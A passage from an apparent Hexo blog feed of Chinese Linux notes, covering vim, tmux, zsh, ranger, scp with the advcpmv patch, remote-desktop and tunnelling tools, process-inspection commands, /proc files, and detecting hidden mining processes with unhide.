id="插入模式下的快速操作"><a href="#插入模式下的快速操作" class="headerlink" title="插入模式下的快速操作"></a>插入模式下的快速操作</h2><blockquote><p>通常配合Ctrl来进行</p></blockquote><p><strong>一次插入-普通模式</strong><br>$Ctrl-o$<br><strong>插入模式中使用粘贴</strong><br>$Ctrl-r$</p><h2 id="宏录制"><a href="#宏录制" class="headerlink" title="宏录制"></a>宏录制</h2><p>1.q+寄存器a-z；<br>2.输入命令；<br>3.q结束宏录制；<br>4.：@a-z使用宏</p><h1 id="迁移"><a href="#迁移" class="headerlink" title="迁移"></a>迁移</h1><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><ol><li>先安装vim-plug</li><li>创建.config&#x2F;nvim&#x2F;_machine_specific.vim</li><li>直接将vim的配置文件迁移过来就可以执行</li><li>需要按coc的要求才能进行coc的安装</li></ol><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>直接拷贝neovim的配置到本地的.config&#x2F;nvim文件夹下，使用pluginstall进行安装，但是有些插件需要额外的配置，需要另外进行，如coc。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CPU挖矿指北</title>
      <link href="/2022/04/05/CPU%E6%8C%96%E7%9F%BF%E6%8C%87%E5%8C%97/"/>
      <url>/2022/04/05/CPU%E6%8C%96%E7%9F%BF%E6%8C%87%E5%8C%97/</url>
      
        <content type="html"><![CDATA[<ul><li>URL: <a href="https://mp.weixin.qq.com/s?__biz=MzA5MzY4NTQwMA==&mid=2651041331&idx=4&sn=4c8a89a3c2a6d563473f0a6545446216&chksm=8bad1dc4bcda94d2641455be29268c187cdfd66fb6a32bb4236331e1e44c470e66219540144d&scene=21#wechat_redirect">01</a> <a href="https://mp.weixin.qq.com/s/xjm1zwRcMtKOv8c4Le9JXQ">02</a><br>TAG: ((6209ac4b-6222-428d-b02a-c1b542d4f621))<br>YEAE:<br>IN A WOED:</li><li><h1 id="top和ps"><a href="#top和ps" class="headerlink" title="top和ps"></a>top和ps</h1>查看进程，都是遍历的 <strong>&#x2F;proc&#x2F;</strong> 目录下的内容，通过<strong>opendir&#x2F;readdir</strong>这些系统调用函数来遍历的。但是无法查找隐藏进程（有些能够避开opendir、readdir）<h1 id="unhide"><a href="#unhide" class="headerlink" title="unhide"></a>unhide</h1>也是遍历 <strong>&#x2F;proc&#x2F;</strong> 目录，和你们不同的是，不用<strong>readdir</strong>，而是从进程id最小到最大，挨个访问 <strong>&#x2F;proc&#x2F;$pid</strong> 目录，一旦发现目录存在而且不在ps老哥的输出结果中，那这就是一个隐藏进程<h1 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a><strong>netstat</strong></h1><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1644663263939_0.png" alt="image.png"></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 收藏 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>远程工具</title>
      <link href="/2022/04/05/%E8%BF%9C%E7%A8%8B%E5%B7%A5%E5%85%B7/"/>
      <url>/2022/04/05/%E8%BF%9C%E7%A8%8B%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<ul><li>URL:<br>TAG: ((6209ac4b-6222-428d-b02a-c1b542d4f621))<br>YEAR:<br>IN A WOED:<br>印象笔记:</li><li><a href="https://github.com/LucienShui/PasteMe">PasteMe</a>：快速分享文本、代码的网站项目。<a href="https://pasteme.cn/#/">在线使用</a><br><a href="https://github.com/certbot/certbot">Certbot</a> ：免费的自动启用和部署 HTTPS 的工具，让你的网站开启 HTTPS 变得简单快捷，<a href="https://certbot.eff.org/">在线</a><br>collapsed:: true<br>在部署教程页面选择服务器的操作系统和 Web 服务器，之后根据给出的步骤一步步的执行命令就行了<br><a href="https://github.com/magic-wormhole/magic-wormhole">Magic Wormhole</a> ： 一条命令就能将文件安全地传送到另外一台电脑上的工具<br>collapsed:: true<br>基于 PAKE（Password-Authenticated Key Exchange）协议实现文件在公网的加密传输，发送和接收均仅需一条命令<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1644923288081_0.png" alt="image.png"></li><li>cowtransfer-uploader<br>((6209eed0-ec26-4520-b237-a647025ddd2b)) : 免费开源的远程桌面软件,开箱即用无需任何配置<br><a href="https://github.com/DarkCoderSc/PowerRemoteDesktop">PowerRemoteDesktop</a>：仅用 PowerShell 实现的远程桌面工具。它易于安装和使用、功能齐全，未依赖现有的协议和工具<br>Determined : GPU共享虚拟，实现类似与Goolge Colab类似的挂载GPU的方式<br>Deskreen : 远程桌面的高级形式<br>Apache Guacamole : 无需安装插件或者客户端的远程桌面，直接网页登入。代替VNC，RDP</li></ul><hr><h1 id="nps-代替frp"><a href="#nps-代替frp" class="headerlink" title="nps : 代替frp"></a>nps : 代替frp</h1><h2 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h2><p>通过sudo .&#x2F;nps进行启动。默认账号是admin，密码为123。 端口为8080<br>可以通过conf&#x2F;nps.conf文件中的web配置进行修改。</p><h2 id="client"><a href="#client" class="headerlink" title="client"></a>client</h2><p>需要先配置client客户端之后才能使用，配置完成client之后会生成一条指令，在客户端执行这条指令就行了。<br>配置成功之后client客户端就会有一条全绿的合法记录。<br>然后根据需要的类型进行指定任务的构建</p><h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p>需要创建ssh就需要配置tcp协议。<br>在tcp协议下创建，然后指定server端端口为22就行了。</p><hr><p>todesk : 免费好用</p>]]></content>
      
      
      
        <tags>
            
            <tag> 收藏 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zsh</title>
      <link href="/2022/04/05/zsh/"/>
      <url>/2022/04/05/zsh/</url>
      
        <content type="html"><![CDATA[<ul><li>URL:<br>TAG: ((6209ac4b-6222-428d-b02a-c1b542d4f621))<br>YEAR:<br>IN A WOED:<br>印象笔记:</li><li><h1 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h1><h2 id="omz"><a href="#omz" class="headerlink" title="omz"></a>omz</h2><blockquote><p>拥有自己的插件管理命令 omz</p></blockquote></li></ul><h3 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h3><table><thead><tr><th>Name</th><th>功能</th></tr></thead><tbody><tr><td>omz plugin</td><td>插件相关命令</td></tr><tr><td>omz theme</td><td>主题管理</td></tr></tbody></table><h2 id="手动安装"><a href="#手动安装" class="headerlink" title="手动安装"></a>手动安装</h2><blockquote><p>主要针对omz插件库里没有的对象。针对主题也是类似的操作</p></blockquote><h3 id="custom"><a href="#custom" class="headerlink" title="custom"></a>custom</h3><p>将需要安装的插件下载到oh-my-zsh&#x2F;custom&#x2F;plugins下，然后在zshrc的plugins里添加对应的名称即可。</p><h3 id="plugins"><a href="#plugins" class="headerlink" title="plugins"></a>plugins</h3><p>在plugins里创建对应插件的文件夹(方便管理)，然后在zshrc里添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> .oh-my-zsh/plugins/*/*.zsh </span><br></pre></td></tr></table></figure><p>插件生效，这种明显是没有第一种来的方便。</p><h1 id="插件推挤"><a href="#插件推挤" class="headerlink" title="插件推挤"></a>插件推挤</h1><p><a href="https://github.com/athityakumar/colorls">Color LS</a> ：以图标的形式实现文件类型<br>autojump ：快速到达想要访问的文件<br>last-working-dir ：载入的时候自动到上次退出的目录<br>web-search：在终端直接打开游览器</p><h1 id="自带功能"><a href="#自带功能" class="headerlink" title="自带功能"></a>自带功能</h1><h2 id="快速跳转"><a href="#快速跳转" class="headerlink" title="快速跳转"></a>快速跳转</h2><blockquote><p>在历史位置中快速跳转</p></blockquote><p>d<br>列出之前访问过的路径，之后可以通过数字直接进入指定的路径</p><blockquote><p>就是集成了pushd那个命令</p><blockquote><p>可以不需要配合cd直接使用</p></blockquote></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tmux</title>
      <link href="/2022/04/05/tmux/"/>
      <url>/2022/04/05/tmux/</url>
      
        <content type="html"><![CDATA[<ul><li>URL:<br>TAG: ((6209ac4b-6222-428d-b02a-c1b542d4f621))<br>YEAR:<br>IN A WOED:<br>印象笔记:</li><li><blockquote><p>tmux通过tmux.conf来进行配置，并且可以安装插件。</p></blockquote></li></ul><p>tmux其实就是一个终端。它由3部分组成session(每一个会话，可以包含多个工作区)、windows(就是工作区)、pane(一个window上的多个窗口)<br>💡 prefix + ? : 调出命令提示</p><blockquote><p>prefix &#x3D; ctrl + b</p></blockquote><h1 id="session"><a href="#session" class="headerlink" title="session"></a>session</h1><table><thead><tr><th>命令</th><th>功能</th></tr></thead><tbody><tr><td>tmux new -s <name></td><td>创建会话</td></tr><tr><td>prefix + d</td><td>后台运行会话</td></tr><tr><td>prefix + x</td><td>中止会话</td></tr><tr><td>prefix + s</td><td>列出所有会话</td></tr><tr><td>prefix + $</td><td>重命名当前会话</td></tr><tr><td>tmux kill-session -t <name></td><td>删除session</td></tr><tr><td>Ctrl+b :kill-session</td><td>删除当前session</td></tr><tr><td>Ctrl+b :kill-server</td><td>删除所有session</td></tr><tr><td>ctrl+b :new</td><td>创建一个新的session</td></tr></tbody></table><h1 id="widows"><a href="#widows" class="headerlink" title="widows"></a>widows</h1><table><thead><tr><th>命令</th><th>功能</th></tr></thead><tbody><tr><td>prefix + c</td><td>创建一个的window</td></tr><tr><td>prefix + n</td><td>跳到下一个window</td></tr><tr><td>prefix + p</td><td>跳到上一个window</td></tr><tr><td>prefix + w</td><td>列出所有的window</td></tr><tr><td>prefix+&amp;</td><td>删除window</td></tr><tr><td>Ctrl+b ,</td><td>重命名window</td></tr></tbody></table><h1 id="pane"><a href="#pane" class="headerlink" title="pane"></a>pane</h1><table><thead><tr><th>命令</th><th>功能</th></tr></thead><tbody><tr><td>prefix + %</td><td>左右分屏（分出一个pane）</td></tr><tr><td>prefix + “</td><td>上下分屏（分出一个pane）</td></tr><tr><td>prefix + o</td><td>移动到下一个pane</td></tr><tr><td>prefix+!</td><td>将当前pane独立为新的window</td></tr><tr><td>prefix+x</td><td>关闭当前的pane</td></tr><tr><td>exit</td><td>推出当前pane</td></tr><tr><td>prefix + b</td><td>移动到上一个pane</td></tr><tr><td>Ctrl+b :resize-pane -U(DLR) (50)</td><td>调整pane大小</td></tr><tr><td>prefix + {</td><td>在window中调换pane位置</td></tr><tr><td>Ctrl+b :join-pane -t $window_name</td><td>移动pane合并至某个window</td></tr><tr><td>Ctrl+b q</td><td>显示pane编号</td></tr><tr><td>prefix+z</td><td>全屏当前的pane</td></tr></tbody></table><h1 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h1><h2 id="复制与粘贴"><a href="#复制与粘贴" class="headerlink" title="复制与粘贴"></a>复制与粘贴</h2><p>复制模式Ctrl+b [：空格标记复制开始，回车结束复制。<br>Ctrl+b ]：粘贴最后一个缓冲区内容<br>Ctrl+b &#x3D;：选择性粘贴缓冲区</p><blockquote><p>💡 可以通过复制模式去查看tmux上方的内容，这部分内容可能会在普通模式下被隐藏。通过esc退出。</p></blockquote><h1 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h1><p>插件管理器<br>tmux通过tpm进行插件管理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/tmux-plugins/tpm ~/.tmux/plugins/tpm</span><br></pre></td></tr></table></figure><p>上面只是地址，其实只需要在tmux.conf里添加</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># git clone https://github.com/tmux-plugins/tpm ~/.tmux/plugins/tpm , use prefix + I install plugins</span></span><br><span class="line"><span class="comment"># List of plugins</span></span><br><span class="line"><span class="built_in">set</span> -g @plugin <span class="string">&#x27;tmux-plugins/tpm&#x27;</span></span><br></pre></td></tr></table></figure><p>就可以了。之后就可以使用prefix+I来进行安装插件。<br>会话永久保存</p><blockquote><p>防止系统在重启之后丢失之前的tmux会话</p></blockquote><p>这里主要用到了2个插件<br><a href="https://link.zhihu.com/?target=https://github.com/tmux-plugins/tmux-resurrect">tmux-resurrect</a> 保存&#x2F;恢复 tmux 打开的会话<br><a href="https://link.zhihu.com/?target=https://github.com/tmux-plugins/tmux-continuum">tmux-continum</a> 自动定时保存和自动恢复会话</p><h2 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># plugins</span></span><br><span class="line"><span class="comment"># prefix + Ctrl-s save;  prefix + Ctrl-r restore.  https://github.com/tmux-plugins/tmux-resurrect</span></span><br><span class="line"><span class="built_in">set</span> -g @plugin <span class="string">&#x27;tmux-plugins/tmux-resurrect&#x27;</span></span><br><span class="line"><span class="built_in">set</span> -g @plugin <span class="string">&#x27;tmux-plugins/tmux-continuum&#x27;</span></span><br><span class="line"><span class="comment"># restore vim/neovim session</span></span><br><span class="line"><span class="built_in">set</span> -g @resurrect-strategy-vim <span class="string">&#x27;session&#x27;</span></span><br><span class="line"><span class="built_in">set</span> -g @resurrect-strategy-nvim <span class="string">&#x27;session&#x27;</span></span><br><span class="line"><span class="built_in">set</span> -g @continuum-restore <span class="string">&#x27;on&#x27;</span></span><br><span class="line"><span class="built_in">set</span> -g @resurrect-capture-pane-contents <span class="string">&#x27;on&#x27;</span></span><br><span class="line"><span class="comment"># Initialize TMUX plugin manager (keep this line at the very bottom of tmux.conf)</span></span><br><span class="line">run <span class="string">&#x27;~/.tmux/plugins/tpm/tpm&#x27;</span></span><br></pre></td></tr></table></figure><p>需要先安装tpm插件管理器。<br>窗口滚轮滚动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加mouse操作</span></span><br><span class="line">setw -g mouse on </span><br></pre></td></tr></table></figure><h1 id="引导键"><a href="#引导键" class="headerlink" title="引导键"></a>引导键</h1><table><thead><tr><th>Name</th><th>功能</th></tr></thead><tbody><tr><td>M</td><td>alt</td></tr><tr><td>S</td><td>shift</td></tr><tr><td>C</td><td>ctrl</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>进程相关</title>
      <link href="/2022/04/05/%E8%BF%9B%E7%A8%8B%E7%9B%B8%E5%85%B3/"/>
      <url>/2022/04/05/%E8%BF%9B%E7%A8%8B%E7%9B%B8%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<ul><li>URL: <a href="https://mp.weixin.qq.com/s/7ajUq4aIM6OJRI-9rB2MtQ">Weixin</a><br>TAG: ((6209ac4b-6222-428d-b02a-c1b542d4f621))<br>YEAR:<br>IN A WOED:<br>印象笔记:</li><li></li></ul><h1 id="标识"><a href="#标识" class="headerlink" title="标识"></a>标识</h1><table><thead><tr><th>UID</th><th>启动进程的用户</th></tr></thead><tbody><tr><td>PID</td><td>进程的进程号</td></tr><tr><td>PPID</td><td>父进程进程号</td></tr><tr><td>C</td><td>cpu使用率</td></tr><tr><td>STIME</td><td>进程启动时的系统时间</td></tr><tr><td>TTY</td><td>进程启动时终端设备</td></tr><tr><td>TIME</td><td>运行进程需要的累积CPU时间</td></tr><tr><td>CMD</td><td>启动程序名称或命令</td></tr></tbody></table><h1 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h1><table><thead><tr><th>命令</th><th>功能</th></tr></thead><tbody><tr><td>-e</td><td>显示运行在系统上的所有进程</td></tr><tr><td>-f</td><td>扩展显示输出</td></tr></tbody></table><h1 id="strace"><a href="#strace" class="headerlink" title="strace"></a>strace</h1><blockquote><p>trace system calls and signals   跟踪进程内部的系统调用和信号</p></blockquote><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1646127447274_0.png" alt="image.png"><br>strace后面跟着启动一个进程，^^可以跟踪启动后进程的系统调用和信号^^<br>这个命令可以看到进程执行时候都调用了哪些系统调用，通过指定不同的选项可以输出系统调用发生的时间，精度可以精确到微秒，甚至还可以统计分析系统「调用的耗时」，^^这在排查进程假死问题的时候很有用，能帮你发现进程卡在哪个系统调用上^^。<br>已经在运行的进程也可以指定-p参数加pid像gdb attach那样附着上去跟踪<br>-</p><h1 id="pstack"><a href="#pstack" class="headerlink" title="pstack"></a>pstack</h1><blockquote><p>print a stack trace of a running process 打印出运行中程序的堆栈信息</p></blockquote><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1646127532031_0.png" alt="image.png"><br>执行命令pstack pid 你能看到当前线程运行中的堆栈信息，其中的pid可用之前的ps命令获得，pstack可以看到进程内启动的线程号，每个进程内线程的「堆栈」内容也能看到。<br>🔔LPW(Light-weight process)<br>1.Linux中没有真正的线程<br>2.Linux中没有的线程Thread是由进程来模拟实现的所以称作：轻量级进程<br>3.进程是「资源管理」的最小单元，线程是「资源调度」的最小单元（这里不考虑协程）</p><h1 id="pstree"><a href="#pstree" class="headerlink" title="pstree"></a>pstree</h1><blockquote><p>display a tree of processes pstree按树形结构打印运行中进程结构信息</p></blockquote><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1646127665066_0.png" alt="image.png"><br>可以直观的查看进程和它启动的线程的关系，并能显示进程标识</p><h1 id="x2F-proc-x2F-pid"><a href="#x2F-proc-x2F-pid" class="headerlink" title="&#x2F;proc&#x2F;pid"></a>&#x2F;proc&#x2F;pid</h1><p>具体内容在 ((621dea74-c48b-4b04-8572-d06cc99477ea))</p><h1 id="reptyr"><a href="#reptyr" class="headerlink" title="reptyr"></a>reptyr</h1><blockquote><p>通过在tmux中使用reptyr抢占进程到当前终端</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">先启动一个tmux</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取进程号</span></span><br><span class="line">ps aux | grep [进程]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">reptyr</span></span><br><span class="line">sudo reptyr -T [进程ID]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>range</title>
      <link href="/2022/04/05/range/"/>
      <url>/2022/04/05/range/</url>
      
        <content type="html"><![CDATA[<ul><li>URL:<br>TAG: ((6209ac4b-6222-428d-b02a-c1b542d4f621))<br>YEAR:<br>IN A WOED:<br>印象笔记:</li><li><blockquote><p>可以直接通过软件源进行安装。</p></blockquote></li></ul><h1 id="初始化配置"><a href="#初始化配置" class="headerlink" title="初始化配置"></a>初始化配置</h1><p>创建配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ranger --copy-config=all</span><br></pre></td></tr></table></figure><p>完全使用自己的配置需要设置全局变量<br>往环境变量里写入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># zshrc</span></span><br><span class="line">RANGER_LOAD_DEFAULT_RC FALSE</span><br></pre></td></tr></table></figure><h1 id="文件介绍"><a href="#文件介绍" class="headerlink" title="文件介绍"></a>文件介绍</h1><h2 id="command"><a href="#command" class="headerlink" title="command"></a>command</h2><p>就是一些功能脚本，官方有很多可以添加的脚本<br>rifle.conf<br>设置什么文件类型用什么默认软件打开<br>这里默认使用系统默认的编辑器，可以通过update-alternative editor来更改默认设置<br>scope.sh<br>预览不同的类型的文件的时候使用什么软件<br>rc.conf<br>配置文件，选项设置和快捷键</p><h1 id="迁移"><a href="#迁移" class="headerlink" title="迁移"></a>迁移</h1><p>通过初始化之后，直接将自己的ranger配置覆盖掉config下的ranger文件夹。</p><h1 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h1><p>图片预览</p><h1 id="w3m"><a href="#w3m" class="headerlink" title="w3m"></a>w3m</h1><p>软件源进行安装，同时配置文件中设置</p><ol><li>preview_images→true</li><li>preview_images_method w3m<h1 id="ueberzug"><a href="#ueberzug" class="headerlink" title="ueberzug"></a>ueberzug</h1>使用pip来进行安装，需要在rc.conf里指定预览程序为ueberzug。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preview_images_method ueberzug</span><br></pre></td></tr></table></figure>git状态查看<br>vcs_aware true<h1 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h1>图标是通过插件实现的ranger_devicons，这个已经集成到了我的ranger配置里，否则是需要重现安装的。<h1 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h1><table><thead><tr><th>命令</th><th>功能</th><th>补充</th></tr></thead><tbody><tr><td>r</td><td>选择打开方式</td><td></td></tr><tr><td>[   ]</td><td>移动父文件夹（与jk相对）</td><td></td></tr><tr><td>shift+h l</td><td>在历史记录里左右移动</td><td></td></tr><tr><td>gh</td><td>回到家目录</td><td></td></tr><tr><td>ge</td><td>跳转到etc</td><td></td></tr><tr><td>zh (Ctrl+h)</td><td>显示隐藏文件</td><td></td></tr><tr><td>o</td><td>排序</td><td></td></tr><tr><td>&#x2F;</td><td>搜索</td><td>nN下一个结果 &#x3D;-</td></tr><tr><td>Ctrl+f</td><td>fzf</td><td></td></tr><tr><td>cw</td><td>重命名</td><td></td></tr><tr><td>v</td><td>全选</td><td></td></tr><tr><td>: bulkrename(cw)</td><td>使用vim进行批量重命名，cw是thecw映射过的</td><td></td></tr><tr><td>du</td><td>同linux</td><td></td></tr><tr><td>c</td><td>压缩</td><td></td></tr><tr><td>shift+x</td><td>解压</td><td></td></tr></tbody></table></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>scp</title>
      <link href="/2022/04/05/scp/"/>
      <url>/2022/04/05/scp/</url>
      
        <content type="html"><![CDATA[<ul><li>URL:<br>TAG: ((6209ac4b-6222-428d-b02a-c1b542d4f621))<br>YEAR:<br>IN A WOED:<br>印象笔记:</li><li><h1 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h1><table><thead><tr><th>命令</th><th>功能</th></tr></thead><tbody><tr><td>-v</td><td>显示详细的连接进度</td></tr><tr><td>-P</td><td>指定端口号</td></tr><tr><td>-r</td><td>文件夹传输</td></tr><tr><td>-6</td><td>使用ipv6协议</td></tr></tbody></table></li></ul><p>使用示例</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -r 指定的文件 用户名@IP:绝对路径</span><br></pre></td></tr></table></figure><h1 id="可视化进度"><a href="#可视化进度" class="headerlink" title="可视化进度"></a>可视化进度</h1><blockquote><p>需要使用Advanced Copy，这是GNU cp和GNU mv程度的一个模块</p></blockquote><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>cp和mv命令是GNU coreutils的一部分。所以你需要从这里下载最新的GNU源代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://ftp.gnu.org/gnu/coreutils/coreutils-8.32.tar.xz</span><br></pre></td></tr></table></figure><p>使用命令解压下载档案</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar xJf coreutils-8.32.tar.xz</span><br></pre></td></tr></table></figure><p>这个命令将在当前目录中提取一个名为coreutils-8.32的文件夹中的coreutils存档。进入coreutils文件夹，使用以下命令下载Advanced Copy补丁</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/jarun/advcpmv/master/advcpmv-0.8-8.32.patch</span><br></pre></td></tr></table></figure><p>运行打上补丁</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">patch -p1 -i advcpmv-0.8-8.32.patch</span><br><span class="line">./configure</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>然后就是进行命令的替换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo cp src/cp /usr/local/bin/cp</span><br><span class="line">sudo cp src/mv /usr/local/bin/mv</span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><blockquote><p>可以通过-g参数或者–progress-bar 来显示进度条</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux文件介绍</title>
      <link href="/2022/04/05/Linux%E6%96%87%E4%BB%B6%E4%BB%8B%E7%BB%8D/"/>
      <url>/2022/04/05/Linux%E6%96%87%E4%BB%B6%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<p>#linux</p><h1 id="x2F-proc"><a href="#x2F-proc" class="headerlink" title="&#x2F;proc"></a>&#x2F;proc</h1><p>id:: 621dea74-c48b-4b04-8572-d06cc99477ea<br>&#x2F;proc系统是一个伪文件系统，它只存在内存当中，而不占用外存空间，以文件系统的方式为内核与进程提供通信的接口。进入系统&#x2F;proc目录：<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1646127756285_0.png" alt="image.png"><br>proc目录<br>&#x2F;proc目录下有很多以数字命名的目录，每个数字代表进程号PID它们是进程目录。系统中当前运行的每一个进程在&#x2F;proc下都对应一个以进程号为目录名的目录&#x2F;proc&#x2F;pid，它们是读取进程信息的接口，我们可以进到这个文件里面，了解进程的运行时信息和统计信息。</p><h2 id="environ"><a href="#environ" class="headerlink" title="environ"></a>environ</h2><p>包含了进程的可用环境变量的列表 。程序出问题了如果不确定环境变量是否设置生效，可以cat这个文件出来查看确认一下。</p><h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><p>这个目录包含了进程打开的每一个文件的链接。从这里可以查看进程打开的文件描述符信息，包括标准输入、输出、错误流，进程打开的socket连接文件描述符也能看到，lsof命令也有类似的作用。</p><h2 id="stat"><a href="#stat" class="headerlink" title="stat"></a>stat</h2><p>包含了进程的所有状态信息，进程号、父进程号、 线程组号、 该任务在用户态运行的时间 、 该任务在用内核态运行的时间、 虚拟地址空间的代码段、 阻塞信号的位图等等信息应有尽有。</p><h2 id="cmdline"><a href="#cmdline" class="headerlink" title="cmdline"></a>cmdline</h2><p>该文件保存了进程的完整命令行</p><h2 id="cwd"><a href="#cwd" class="headerlink" title="cwd"></a>cwd</h2><p>一个符号连接, 指向进程当前的工作目录</p><h2 id="exe"><a href="#exe" class="headerlink" title="exe"></a>exe</h2><p>包含了正在进程中运行的程序链接</p><h2 id="mem"><a href="#mem" class="headerlink" title="mem"></a>mem</h2><p>包含了进程在内存中的内容</p><h2 id="statm"><a href="#statm" class="headerlink" title="statm"></a>statm</h2><p>包含了进程的内存使用信息</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux教程</title>
      <link href="/2022/04/05/Linux%E6%95%99%E7%A8%8B/"/>
      <url>/2022/04/05/Linux%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>#Linux<br><a href="https://github.com/MintCN/linux-insides-zh">Linux 内核揭秘</a> ，<a href="https://github.com/0xAX/linux-insides">英文版本</a><br>《<a href="https://github.com/me115/linuxtools_rst">Linux 工具快速教程</a>》，<a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/">在线阅读</a><br>像小说一样品读 <a href="https://github.com/sunym1993/flash-linux0.11-talk">Linux 0.11</a> 核心代码<br>-<br>-</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux基础</title>
      <link href="/2022/04/05/Linux%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/04/05/Linux%E5%9F%BA%E7%A1%80/</url>
      
